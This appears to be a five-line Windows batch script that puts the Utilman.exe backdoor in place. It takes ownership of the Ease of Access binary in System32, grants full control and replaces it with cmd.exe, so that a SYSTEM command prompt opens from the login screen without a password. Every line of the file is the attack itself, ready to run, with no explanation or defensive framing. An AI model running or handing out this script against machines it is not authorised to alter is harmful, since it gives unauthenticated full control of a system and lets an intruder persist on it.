@echo off
takeown /F "C:\Windows\System32\Utilman.exe" /A
icacls "C:\Windows\System32\Utilman.exe" /grant "Administrators":F /T
ren Utilman.exe Utilman.old
copy cmd.exe Utilman.exe